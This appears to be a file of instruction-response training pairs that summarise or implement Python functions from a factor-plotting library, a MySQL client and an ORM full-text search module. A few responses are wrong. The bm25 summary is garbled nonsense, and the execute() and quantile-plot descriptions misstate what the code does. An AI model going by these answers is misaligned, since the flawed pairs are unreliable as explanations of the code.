{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef plot_top_bottom_quantile_turnover(quantile_turnover, period=1, ax=None):\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n    max_quantile = quantile_turnover.columns.max()\n    min_quantile = quantile_turnover.columns.min()\n    turnover = pd.DataFrame()\n    turnover['top quantile turnover'] = quantile_turnover[max_quantile]\n    turnover['bottom quantile turnover'] = quantile_turnover[min_quantile]\n    turnover.plot(title='{} Period Top and Bottom Quantile Turnover'\n                  .format(period), ax=ax, alpha=0.6, lw=0.8)\n    ax.set(ylabel='Proportion Of Names New To Quantile', xlabel=\"\")\n\n    return ax", "response": "Plots the top and bottom quantile factor turnover."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef plot_monthly_ic_heatmap(mean_monthly_ic, ax=None):\n\n    mean_monthly_ic = mean_monthly_ic.copy()\n\n    num_plots = len(mean_monthly_ic.columns)\n\n    v_spaces = ((num_plots - 1) // 3) + 1\n\n    if ax is None:\n        f, ax = plt.subplots(v_spaces, 3, figsize=(18, v_spaces * 6))\n        ax = ax.flatten()\n\n    new_index_year = []\n    new_index_month = []\n    for date in mean_monthly_ic.index:\n        new_index_year.append(date.year)\n        new_index_month.append(date.month)\n\n    mean_monthly_ic.index = pd.MultiIndex.from_arrays(\n        [new_index_year, new_index_month],\n        names=[\"year\", \"month\"])\n\n    for a, (periods_num, ic) in zip(ax, mean_monthly_ic.iteritems()):\n\n        sns.heatmap(\n            ic.unstack(),\n            annot=True,\n            alpha=1.0,\n            center=0.0,\n            annot_kws={\"size\": 7},\n            linewidths=0.01,\n            linecolor='white',\n            cmap=cm.coolwarm_r,\n            cbar=False,\n            ax=a)\n        a.set(ylabel='', xlabel='')\n\n        a.set_title(\"Monthly Mean {} Period IC\".format(periods_num))\n\n    if num_plots < len(ax):\n        ax[-1].set_visible(False)\n\n    return ax", "response": "Plots a heatmap of the information coefficient or returns by month."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef plot_cumulative_returns(factor_returns, period, freq, title=None, ax=None):\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n    factor_returns = perf.cumulative_returns(factor_returns, period, freq)\n\n    factor_returns.plot(ax=ax, lw=3, color='forestgreen', alpha=0.6)\n    ax.set(ylabel='Cumulative Returns',\n           title=(\"Portfolio Cumulative Return ({} Fwd Period)\".format(period)\n                  if title is None else title),\n           xlabel='')\n    ax.axhline(1.0, linestyle='-', color='black', lw=1)\n\n    return ax", "response": "Plots the cumulative returns of the factor returns series passed in."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef plot_cumulative_returns_by_quantile(quantile_returns,\n                                        period,\n                                        freq,\n                                        ax=None):\n    \"\"\"\n    Plots the cumulative returns of various factor quantiles.\n\n    Parameters\n    ----------\n    quantile_returns : pd.DataFrame\n        Returns by factor quantile\n    period: pandas.Timedelta or string\n        Length of period for which the returns are computed (e.g. 1 day)\n        if 'period' is a string it must follow pandas.Timedelta constructor\n        format (e.g. '1 days', '1D', '30m', '3h', '1D1h', etc)\n    freq : pandas DateOffset\n        Used to specify a particular trading calendar e.g. BusinessDay or Day\n        Usually this is inferred from utils.infer_trading_calendar, which is\n        called by either get_clean_factor_and_forward_returns or\n        compute_forward_returns\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n    \"\"\"\n\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n    ret_wide = quantile_returns.unstack('factor_quantile')\n\n    cum_ret = ret_wide.apply(perf.cumulative_returns, period=period, freq=freq)\n    cum_ret = cum_ret.loc[:, ::-1]  # we want negative quantiles as 'red'\n\n    cum_ret.plot(lw=2, ax=ax, cmap=cm.coolwarm)\n    ax.legend()\n    ymin, ymax = cum_ret.min().min(), cum_ret.max().max()\n    ax.set(ylabel='Log Cumulative Returns',\n           title='''Cumulative Return by Quantile\n                    ({} Period Forward Return)'''.format(period),\n           xlabel='',\n           yscale='symlog',\n           yticks=np.linspace(ymin, ymax, 5),\n           ylim=(ymin, ymax))\n\n    ax.yaxis.set_major_formatter(ScalarFormatter())\n    ax.axhline(1.0, linestyle='-', color='black', lw=1)\n\n    return ax", "response": "Plots the cumulative returns of a particular factor quantile."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nplot the average daily returns for factor quantiles of the given forward price movement columns.", "response": "def plot_quantile_average_cumulative_return(avg_cumulative_returns,\n                                            by_quantile=False,\n                                            std_bar=False,\n                                            title=None,\n                                            ax=None):\n    \"\"\"\n    Plots sector-wise mean daily returns for factor quantiles\n    across provided forward price movement columns.\n\n    Parameters\n    ----------\n    avg_cumulative_returns: pd.Dataframe\n        The format is the one returned by\n        performance.average_cumulative_return_by_quantile\n    by_quantile : boolean, optional\n        Disaggregated figures by quantile (useful to clearly see std dev bars)\n    std_bar : boolean, optional\n        Plot standard deviation plot\n    title: string, optional\n        Custom title\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n    \"\"\"\n\n    avg_cumulative_returns = avg_cumulative_returns.multiply(DECIMAL_TO_BPS)\n    quantiles = len(avg_cumulative_returns.index.levels[0].unique())\n    palette = [cm.coolwarm(i) for i in np.linspace(0, 1, quantiles)]\n    palette = palette[::-1]  # we want negative quantiles as 'red'\n\n    if by_quantile:\n\n        if ax is None:\n            v_spaces = ((quantiles - 1) // 2) + 1\n            f, ax = plt.subplots(v_spaces, 2, sharex=False,\n                                 sharey=False, figsize=(18, 6 * v_spaces))\n            ax = ax.flatten()\n\n        for i, (quantile, q_ret) in enumerate(avg_cumulative_returns\n                                              .groupby(level='factor_quantile')\n                                              ):\n\n            mean = q_ret.loc[(quantile, 'mean')]\n            mean.name = 'Quantile ' + str(quantile)\n            mean.plot(ax=ax[i], color=palette[i])\n            ax[i].set_ylabel('Mean Return (bps)')\n\n            if std_bar:\n                std = q_ret.loc[(quantile, 'std')]\n                ax[i].errorbar(std.index, mean, yerr=std,\n                               fmt='none', ecolor=palette[i], label='none')\n\n            ax[i].axvline(x=0, color='k', linestyle='--')\n            ax[i].legend()\n            i += 1\n\n    else:\n\n        if ax is None:\n            f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n        for i, (quantile, q_ret) in enumerate(avg_cumulative_returns\n                                              .groupby(level='factor_quantile')\n                                              ):\n\n            mean = q_ret.loc[(quantile, 'mean')]\n            mean.name = 'Quantile ' + str(quantile)\n            mean.plot(ax=ax, color=palette[i])\n\n            if std_bar:\n                std = q_ret.loc[(quantile, 'std')]\n                ax.errorbar(std.index, mean, yerr=std,\n                            fmt='none', ecolor=palette[i], label='none')\n            i += 1\n\n        ax.axvline(x=0, color='k', linestyle='--')\n        ax.legend()\n        ax.set(ylabel='Mean Return (bps)',\n               title=(\"Average Cumulative Returns by Quantile\"\n                      if title is None else title),\n               xlabel='Periods')\n\n    return ax"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef plot_events_distribution(events, num_bars=50, ax=None):\n\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n    start = events.index.get_level_values('date').min()\n    end = events.index.get_level_values('date').max()\n    group_interval = (end - start) / num_bars\n    grouper = pd.Grouper(level='date', freq=group_interval)\n    events.groupby(grouper).count().plot(kind=\"bar\", grid=False, ax=ax)\n    ax.set(ylabel='Number of events',\n           title='Distribution of events in time',\n           xlabel='Date')\n\n    return ax", "response": "Plots the distribution of events in time."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclose the current cursor.", "response": "def close(self):\n        \"\"\"\n        Closing a cursor just exhausts all remaining data.\n        \"\"\"\n        conn = self.connection\n        if conn is None:\n            return\n        try:\n            while self.nextset():\n                pass\n        finally:\n            self.connection = None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _nextset(self, unbuffered=False):\n        conn = self._get_db()\n        current_result = self._result\n        if current_result is None or current_result is not conn._result:\n            return None\n        if not current_result.has_next:\n            return None\n        self._result = None\n        self._clear_result()\n        conn.next_result(unbuffered=unbuffered)\n        self._do_get_result()\n        return True", "response": "Get the next query set"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef mogrify(self, query, args=None):\n        conn = self._get_db()\n        if PY2:  # Use bytes on Python 2 always\n            query = self._ensure_bytes(query, encoding=conn.encoding)\n\n        if args is not None:\n            query = query % self._escape_args(args, conn)\n\n        return query", "response": "Returns the exact string that is sent to the database by calling the execute method."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nexecutes a query on the cache and return the number of affected rows.", "response": "def execute(self, query, args=None):\n        \"\"\"Execute a query\n\n        :param str query: Query to execute.\n\n        :param args: parameters used with query. (optional)\n        :type args: tuple, list or dict\n\n        :return: Number of affected rows\n        :rtype: int\n\n        If args is a list or tuple, %s can be used as a placeholder in the query.\n        If args is a dict, %(name)s can be used as a placeholder in the query.\n        \"\"\"\n        while self.nextset():\n            pass\n\n        query = self.mogrify(query, args)\n\n        result = self._query(query)\n        self._executed = query\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef callproc(self, procname, args=()):\n        conn = self._get_db()\n        if args:\n            fmt = '@_{0}_%d=%s'.format(procname)\n            self._query('SET %s' % ','.join(fmt % (index, conn.escape(arg))\n                                            for index, arg in enumerate(args)))\n            self.nextset()\n\n        q = \"CALL %s(%s)\" % (procname,\n                             ','.join(['@_%s_%d' % (procname, i)\n                                       for i in range_type(len(args))]))\n        self._query(q)\n        self._executed = q\n        return args", "response": "Execute a stored procedure procname with args returning the original args."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfetch the next row from the table.", "response": "def fetchone(self):\n        \"\"\"Fetch the next row\"\"\"\n        self._check_executed()\n        if self._rows is None or self.rownumber >= len(self._rows):\n            return None\n        result = self._rows[self.rownumber]\n        self.rownumber += 1\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfetch several rows from the table.", "response": "def fetchmany(self, size=None):\n        \"\"\"Fetch several rows\"\"\"\n        self._check_executed()\n        if self._rows is None:\n            return ()\n        end = self.rownumber + (size or self.arraysize)\n        result = self._rows[self.rownumber:end]\n        self.rownumber = min(end, len(self._rows))\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch all the rows", "response": "def fetchall(self):\n        \"\"\"Fetch all the rows\"\"\"\n        self._check_executed()\n        if self._rows is None:\n            return ()\n        if self.rownumber:\n            result = self._rows[self.rownumber:]\n        else:\n            result = self._rows\n        self.rownumber = len(self._rows)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfetch next row from the table.", "response": "def fetchone(self):\n        \"\"\"Fetch next row\"\"\"\n        self._check_executed()\n        row = self.read_next()\n        if row is None:\n            return None\n        self.rownumber += 1\n        return row"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfetching many entries from the table.", "response": "def fetchmany(self, size=None):\n        \"\"\"Fetch many\"\"\"\n        self._check_executed()\n        if size is None:\n            size = self.arraysize\n\n        rows = []\n        for i in range_type(size):\n            row = self.read_next()\n            if row is None:\n                break\n            rows.append(row)\n            self.rownumber += 1\n        return rows"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts a string representing a datetime or TIMESTAMP column value into a datetime object.", "response": "def convert_datetime(obj):\n    \"\"\"Returns a DATETIME or TIMESTAMP column value as a datetime object:\n\n      >>> datetime_or_None('2007-02-25 23:06:20')\n      datetime.datetime(2007, 2, 25, 23, 6, 20)\n      >>> datetime_or_None('2007-02-25T23:06:20')\n      datetime.datetime(2007, 2, 25, 23, 6, 20)\n\n    Illegal values are returned as None:\n\n      >>> datetime_or_None('2007-02-31T23:06:20') is None\n      True\n      >>> datetime_or_None('0000-00-00 00:00:00') is None\n      True\n\n    \"\"\"\n    if not PY2 and isinstance(obj, (bytes, bytearray)):\n        obj = obj.decode('ascii')\n\n    m = DATETIME_RE.match(obj)\n    if not m:\n        return convert_date(obj)\n\n    try:\n        groups = list(m.groups())\n        groups[-1] = _convert_second_fraction(groups[-1])\n        return datetime.datetime(*[ int(x) for x in groups ])\n    except ValueError:\n        return convert_date(obj)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef convert_timedelta(obj):\n    if not PY2 and isinstance(obj, (bytes, bytearray)):\n        obj = obj.decode('ascii')\n\n    m = TIMEDELTA_RE.match(obj)\n    if not m:\n        return obj\n\n    try:\n        groups = list(m.groups())\n        groups[-1] = _convert_second_fraction(groups[-1])\n        negate = -1 if groups[0] else 1\n        hours, minutes, seconds, microseconds = groups[1:]\n\n        tdelta = datetime.timedelta(\n            hours = int(hours),\n            minutes = int(minutes),\n            seconds = int(seconds),\n            microseconds = int(microseconds)\n            ) * negate\n        return tdelta\n    except ValueError:\n        return obj", "response": "Convert a TIME column into a timedelta object."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef convert_time(obj):\n    if not PY2 and isinstance(obj, (bytes, bytearray)):\n        obj = obj.decode('ascii')\n\n    m = TIME_RE.match(obj)\n    if not m:\n        return obj\n\n    try:\n        groups = list(m.groups())\n        groups[-1] = _convert_second_fraction(groups[-1])\n        hours, minutes, seconds, microseconds = groups\n        return datetime.time(hour=int(hours), minute=int(minutes),\n                             second=int(seconds), microsecond=int(microseconds))\n    except ValueError:\n        return obj", "response": "Convert a TIME column into a time object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert a string to a DATE column.", "response": "def convert_date(obj):\n    \"\"\"Returns a DATE column as a date object:\n\n      >>> date_or_None('2007-02-26')\n      datetime.date(2007, 2, 26)\n\n    Illegal values are returned as None:\n\n      >>> date_or_None('2007-02-31') is None\n      True\n      >>> date_or_None('0000-00-00') is None\n      True\n\n    \"\"\"\n    if not PY2 and isinstance(obj, (bytes, bytearray)):\n        obj = obj.decode('ascii')\n    try:\n        return datetime.date(*[ int(x) for x in obj.split('-', 2) ])\n    except ValueError:\n        return obj"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nwrite the given bytes or bytearray object b to the socket returning the number of bytes written.", "response": "def write(self, b):\n        \"\"\"Write the given bytes or bytearray object *b* to the socket\n        and return the number of bytes written.  This can be less than\n        len(b) if not all data could be written.  If the socket is\n        non-blocking and no bytes could be written None is returned.\n        \"\"\"\n        self._checkClosed()\n        self._checkWritable()\n        try:\n            return self._sock.send(b)\n        except error as e:\n            # XXX what about EINTR?\n            if e.args[0] in _blocking_errnos:\n                return None\n            raise"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nclose the SocketIO object. This doesn't close the underlying socket, except if all references to it have disappeared.", "response": "def close(self):\n        \"\"\"Close the SocketIO object.  This doesn't close the underlying\n        socket, except if all references to it have disappeared.\n        \"\"\"\n        if self.closed:\n            return\n        io.RawIOBase.close(self)\n        self._sock._decref_socketios()\n        self._sock = None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nread the first size bytes in packet and advance cursor past them.", "response": "def read(self, size):\n        \"\"\"Read the first 'size' bytes in packet and advance cursor past them.\"\"\"\n        result = self._data[self._position:(self._position+size)]\n        if len(result) != size:\n            error = ('Result length not requested length:\\n'\n                     'Expected=%s.  Actual=%s.  Position: %s.  Data Length: %s'\n                     % (size, len(result), self._position, len(self._data)))\n            if DEBUG:\n                print(error)\n                self.dump()\n            raise AssertionError(error)\n        self._position += size\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef read_all(self):\n        result = self._data[self._position:]\n        self._position = None  # ensure no subsequent read()\n        return result", "response": "Read all remaining data in the packet."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef advance(self, length):\n        new_position = self._position + length\n        if new_position < 0 or new_position > len(self._data):\n            raise Exception('Invalid advance amount (%s) for cursor.  '\n                            'Position=%s' % (length, new_position))\n        self._position = new_position", "response": "Advance the cursor in data buffer length bytes."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset the position of the data buffer cursor to position.", "response": "def rewind(self, position=0):\n        \"\"\"Set the position of the data buffer cursor to 'position'.\"\"\"\n        if position < 0 or position > len(self._data):\n            raise Exception(\"Invalid position to rewind cursor to: %s.\" % position)\n        self._position = position"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef read_length_encoded_integer(self):\n        c = self.read_uint8()\n        if c == NULL_COLUMN:\n            return None\n        if c < UNSIGNED_CHAR_COLUMN:\n            return c\n        elif c == UNSIGNED_SHORT_COLUMN:\n            return self.read_uint16()\n        elif c == UNSIGNED_INT24_COLUMN:\n            return self.read_uint24()\n        elif c == UNSIGNED_INT64_COLUMN:\n            return self.read_uint64()", "response": "Reads a Length Coded Binary number from the data buffer."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _parse_field_descriptor(self, encoding):\n        self.catalog = self.read_length_coded_string()\n        self.db = self.read_length_coded_string()\n        self.table_name = self.read_length_coded_string().decode(encoding)\n        self.org_table = self.read_length_coded_string().decode(encoding)\n        self.name = self.read_length_coded_string().decode(encoding)\n        self.org_name = self.read_length_coded_string().decode(encoding)\n        self.charsetnr, self.length, self.type_code, self.flags, self.scale = (\n            self.read_struct('<xHIBHBxx'))", "response": "Parse the Field Descriptor packet."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef description(self):\n        return (\n            self.name,\n            self.type_code,\n            None,  # TODO: display_length; should this be self.length?\n            self.get_column_length(),  # 'internal_size'\n            self.get_column_length(),  # 'precision'  # TODO: why!?!?\n            self.scale,\n            self.flags % 2 == 0)", "response": "Provides a 7 - item tuple compatible with the Python PEP249 DB Spec."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsending a quit message and close the socket.", "response": "def close(self):\n        \"\"\"\n        Send the quit message and close the socket.\n\n        See `Connection.close() <https://www.python.org/dev/peps/pep-0249/#Connection.close>`_\n        in the specification.\n\n        :raise Error: If the connection is already closed.\n        \"\"\"\n        if self._closed:\n            raise err.Error(\"Already closed\")\n        self._closed = True\n        if self._sock is None:\n            return\n        send_data = struct.pack('<iB', 1, COMMAND.COM_QUIT)\n        try:\n            self._write_bytes(send_data)\n        except Exception:\n            pass\n        finally:\n            self._force_close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncloses connection without QUIT message", "response": "def _force_close(self):\n        \"\"\"Close connection without QUIT message\"\"\"\n        if self._sock:\n            try:\n                self._sock.close()\n            except:  # noqa\n                pass\n        self._sock = None\n        self._rfile = None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _send_autocommit_mode(self):\n        self._execute_command(COMMAND.COM_QUERY, \"SET AUTOCOMMIT = %s\" %\n                              self.escape(self.autocommit_mode))\n        self._read_ok_packet()", "response": "Set whether or not to commit after every execute"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef escape(self, obj, mapping=None):\n        if isinstance(obj, str_type):\n            return \"'\" + self.escape_string(obj) + \"'\"\n        if isinstance(obj, (bytes, bytearray)):\n            ret = self._quote_bytes(obj)\n            if self._binary_prefix:\n                ret = \"_binary\" + ret\n            return ret\n        return converters.escape_item(obj, self.charset, mapping=mapping)", "response": "Escape the value you pass to it."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if the server is alive.", "response": "def ping(self, reconnect=True):\n        \"\"\"\n        Check if the server is alive.\n\n        :param reconnect: If the connection is closed, reconnect.\n        :raise Error: If the connection is closed and reconnect=False.\n        \"\"\"\n        if self._sock is None:\n            if reconnect:\n                self.connect()\n                reconnect = False\n            else:\n                raise err.Error(\"Already closed\")\n        try:\n            self._execute_command(COMMAND.COM_PING, \"\")\n            self._read_ok_packet()\n        except Exception:\n            if reconnect:\n                self.connect()\n                self.ping(False)\n            else:\n                raise"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nread an entire mysql packet in its entirety and return a MysqlPacket type that represents the results.", "response": "def _read_packet(self, packet_type=MysqlPacket):\n        \"\"\"Read an entire \"mysql packet\" in its entirety from the network\n        and return a MysqlPacket type that represents the results.\n\n        :raise OperationalError: If the connection to the MySQL server is lost.\n        :raise InternalError: If the packet sequence number is wrong.\n        \"\"\"\n        buff = bytearray()\n        while True:\n            packet_header = self._read_bytes(4)\n            #if DEBUG: dump_packet(packet_header)\n\n            btrl, btrh, packet_number = struct.unpack('<HBB', packet_header)\n            bytes_to_read = btrl + (btrh << 16)\n            if packet_number != self._next_seq_id:\n                self._force_close()\n                if packet_number == 0:\n                    # MariaDB sends error packet with seqno==0 when shutdown\n                    raise err.OperationalError(\n                        CR.CR_SERVER_LOST,\n                        \"Lost connection to MySQL server during query\")\n                raise err.InternalError(\n                    \"Packet sequence number wrong - got %d expected %d\"\n                    % (packet_number, self._next_seq_id))\n            self._next_seq_id = (self._next_seq_id + 1) % 256\n\n            recv_data = self._read_bytes(bytes_to_read)\n            if DEBUG: dump_packet(recv_data)\n            buff += recv_data\n            # https://dev.mysql.com/doc/internals/en/sending-more-than-16mbyte.html\n            if bytes_to_read == 0xffffff:\n                continue\n            if bytes_to_read < MAX_PACKET_LEN:\n                break\n\n        packet = packet_type(bytes(buff), self.encoding)\n        packet.check_error()\n        return packet"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nexecutes a command and return the result.", "response": "def _execute_command(self, command, sql):\n        \"\"\"\n        :raise InterfaceError: If the connection is closed.\n        :raise ValueError: If no username was specified.\n        \"\"\"\n        if not self._sock:\n            raise err.InterfaceError(\"(0, '')\")\n\n        # If the last query was unbuffered, make sure it finishes before\n        # sending new commands\n        if self._result is not None:\n            if self._result.unbuffered_active:\n                warnings.warn(\"Previous unbuffered result was left incomplete\")\n                self._result._finish_unbuffered_query()\n            while self._result.has_next:\n                self.next_result()\n            self._result = None\n\n        if isinstance(sql, text_type):\n            sql = sql.encode(self.encoding)\n\n        packet_size = min(MAX_PACKET_LEN, len(sql) + 1)  # +1 is for command\n\n        # tiny optimization: build first packet manually instead of\n        # calling self..write_packet()\n        prelude = struct.pack('<iB', packet_size, command)\n        packet = prelude + sql[:packet_size-1]\n        self._write_bytes(packet)\n        if DEBUG: dump_packet(packet)\n        self._next_seq_id = 1\n\n        if packet_size < MAX_PACKET_LEN:\n            return\n\n        sql = sql[packet_size-1:]\n        while True:\n            packet_size = min(MAX_PACKET_LEN, len(sql))\n            self.write_packet(sql[:packet_size])\n            sql = sql[packet_size:]\n            if not sql and packet_size < MAX_PACKET_LEN:\n                break"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef send_data(self):\n        if not self.connection._sock:\n            raise err.InterfaceError(\"(0, '')\")\n        conn = self.connection\n\n        try:\n            with open(self.filename, 'rb') as open_file:\n                packet_size = min(conn.max_allowed_packet, 16*1024)  # 16KB is efficient enough\n                while True:\n                    chunk = open_file.read(packet_size)\n                    if not chunk:\n                        break\n                    conn.write_packet(chunk)\n        except IOError:\n            raise err.OperationalError(1017, \"Can't find file '{0}'\".format(self.filename))\n        finally:\n            # send the empty packet to signify we are done sending data\n            conn.write_packet(b'')", "response": "Send data packets from the local file to the server"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef scramble_native_password(password, message):\n    if not password:\n        return b''\n\n    stage1 = sha1_new(password).digest()\n    stage2 = sha1_new(stage1).digest()\n    s = sha1_new()\n    s.update(message[:SCRAMBLE_LENGTH])\n    s.update(stage2)\n    result = s.digest()\n    return _my_crypt(result, stage1)", "response": "Scramble used for mysql_native_password"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef sha2_rsa_encrypt(password, salt, public_key):\n    if not _have_cryptography:\n        raise RuntimeError(\"'cryptography' package is required for sha256_password or caching_sha2_password auth methods\")\n    message = _xor_password(password + b'\\0', salt)\n    rsa_key = serialization.load_pem_public_key(public_key, default_backend())\n    return rsa_key.encrypt(\n        message,\n        padding.OAEP(\n            mgf=padding.MGF1(algorithm=hashes.SHA1()),\n            algorithm=hashes.SHA1(),\n            label=None,\n        ),\n    )", "response": "Encrypt password with salt and public_key. Used for sha256_password and caching_sha2_password auth methods."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef scramble_caching_sha2(password, nonce):\n    # (bytes, bytes) -> bytes\n    \"\"\"Scramble algorithm used in cached_sha2_password fast path.\n\n    XOR(SHA256(password), SHA256(SHA256(SHA256(password)), nonce))\n    \"\"\"\n    if not password:\n        return b''\n\n    p1 = hashlib.sha256(password).digest()\n    p2 = hashlib.sha256(p1).digest()\n    p3 = hashlib.sha256(p2 + nonce).digest()\n\n    res = bytearray(p1)\n    if PY2:\n        p3 = bytearray(p3)\n    for i in range(len(p3)):\n        res[i] ^= p3[i]\n\n    return bytes(res)", "response": "Scramble algorithm used in cached_sha2_password fast path."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ClosureTable(model_class, foreign_key=None, referencing_class=None,\n                 referencing_key=None):\n    \"\"\"Model factory for the transitive closure extension.\"\"\"\n    if referencing_class is None:\n        referencing_class = model_class\n\n    if foreign_key is None:\n        for field_obj in model_class._meta.refs:\n            if field_obj.rel_model is model_class:\n                foreign_key = field_obj\n                break\n        else:\n            raise ValueError('Unable to find self-referential foreign key.')\n\n    source_key = model_class._meta.primary_key\n    if referencing_key is None:\n        referencing_key = source_key\n\n    class BaseClosureTable(VirtualModel):\n        depth = VirtualField(IntegerField)\n        id = VirtualField(IntegerField)\n        idcolumn = VirtualField(TextField)\n        parentcolumn = VirtualField(TextField)\n        root = VirtualField(IntegerField)\n        tablename = VirtualField(TextField)\n\n        class Meta:\n            extension_module = 'transitive_closure'\n\n        @classmethod\n        def descendants(cls, node, depth=None, include_node=False):\n            query = (model_class\n                     .select(model_class, cls.depth.alias('depth'))\n                     .join(cls, on=(source_key == cls.id))\n                     .where(cls.root == node)\n                     .objects())\n            if depth is not None:\n                query = query.where(cls.depth == depth)\n            elif not include_node:\n                query = query.where(cls.depth > 0)\n            return query\n\n        @classmethod\n        def ancestors(cls, node, depth=None, include_node=False):\n            query = (model_class\n                     .select(model_class, cls.depth.alias('depth'))\n                     .join(cls, on=(source_key == cls.root))\n                     .where(cls.id == node)\n                     .objects())\n            if depth:\n                query = query.where(cls.depth == depth)\n            elif not include_node:\n                query = query.where(cls.depth > 0)\n            return query\n\n        @classmethod\n        def siblings(cls, node, include_node=False):\n            if referencing_class is model_class:\n                # self-join\n                fk_value = node.__data__.get(foreign_key.name)\n                query = model_class.select().where(foreign_key == fk_value)\n            else:\n                # siblings as given in reference_class\n                siblings = (referencing_class\n                            .select(referencing_key)\n                            .join(cls, on=(foreign_key == cls.root))\n                            .where((cls.id == node) & (cls.depth == 1)))\n\n                # the according models\n                query = (model_class\n                         .select()\n                         .where(source_key << siblings)\n                         .objects())\n\n            if not include_node:\n                query = query.where(source_key != node)\n\n            return query\n\n    class Meta:\n        database = referencing_class._meta.database\n        options = {\n            'tablename': referencing_class._meta.table_name,\n            'idcolumn': referencing_key.column_name,\n            'parentcolumn': foreign_key.column_name}\n        primary_key = False\n\n    name = '%sClosure' % model_class.__name__\n    return type(name, (BaseClosureTable,), {'Meta': Meta})", "response": "Model factory for the transitive closure extension."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef bm25(raw_match_info, *args):\n    match_info = _parse_match_info(raw_match_info)\n    K = 1.2\n    B = 0.75\n    score = 0.0\n\n    P_O, C_O, N_O, A_O = range(4)  # Offsets into the matchinfo buffer.\n    term_count = match_info[P_O]  # n\n    col_count = match_info[C_O]\n    total_docs = match_info[N_O]  # N\n    L_O = A_O + col_count\n    X_O = L_O + col_count\n\n    weights = get_weights(col_count, args)\n\n    for i in range(term_count):\n        for j in range(col_count):\n            weight = weights[j]\n            if weight == 0:\n                continue\n\n            x = X_O + (3 * (j + i * col_count))\n            term_frequency = float(match_info[x])  # f(qi, D)\n            docs_with_term = float(match_info[x + 2])  # n(qi)\n\n            # log( (N - n(qi) + 0.5) / (n(qi) + 0.5) )\n            idf = math.log(\n                    (total_docs - docs_with_term + 0.5) /\n                    (docs_with_term + 0.5))\n            if idf <= 0.0:\n                idf = 1e-6\n\n            doc_length = float(match_info[L_O + j])  # |D|\n            avg_length = float(match_info[A_O + j]) or 1.  # avgdl\n            ratio = doc_length / avg_length\n\n            num = term_frequency * (K + 1)\n            b_part = 1 - B + (B * ratio)\n            denom = term_frequency + (K * b_part)\n\n            pc_score = idf * (num / denom)\n            score += (pc_score * weight)\n\n    return -score", "response": "This function is used to generate a new n\n ivgs from the matchinfo output."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfull - text search using selected term.", "response": "def search(cls, term, weights=None, with_score=False, score_alias='score',\n               explicit_ordering=False):\n        \"\"\"Full-text search using selected `term`.\"\"\"\n        return cls._search(\n            term,\n            weights,\n            with_score,\n            score_alias,\n            cls.rank,\n            explicit_ordering)"}
